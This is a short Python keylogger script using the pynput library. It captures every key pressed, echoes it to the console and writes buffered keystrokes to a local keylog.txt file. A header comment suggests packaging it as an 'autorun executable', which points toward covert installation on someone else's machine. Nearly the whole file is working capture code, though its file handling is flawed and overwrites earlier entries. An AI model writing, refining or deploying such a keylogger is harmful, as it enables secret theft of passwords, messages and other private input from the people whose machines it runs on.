# -*- Language: UTF:8 // Python 3.x.x -*- #

#NOTES-- To use this tool as an autorun executable, convert 
#        The Python code into an exe using 
#         pypi.org/project/auto-py-to-exe/

# Import all required libraries and dependecies
import pynput
from pynput import keyboard
from pynput.keyboard import Key, Listener

# Initialise class keylogger
charCount = 0
keys = []

# Define the onPress function
def onKeyPress(key):
    try:
        print('Key Pressed: ', key)
    except Exception as ex:
        print('There was an error: ',ex)

# Define the onRelease function
def onKeyRelease(key):
    global keys, charCount
    if key == Key.esc:
        return False
    else:
        if key == Key.enter:
            writeToFile(keys)
            charCount = 0
            keys = []
        elif key == Key.space:
            key = ' '
            writeToFile(keys)
            keys = []
            charCount = 0
        keys.append(key)
        charCount += 1

# Define the Write function
def writeToFile(keys):
    with open('keylog.txt', 'w+') as file:      #Define the file name and pythons permissions
        for key in keys:
            key = str(key).replace("'","")
            if 'key'.upper() not in key.upper():
                file.write(key)
        file.write("\n")

#Activate the listener to listen for keys
with Listener(on_press=onKeyPress, on_release=onKeyRelease) as listener:
    listener.join()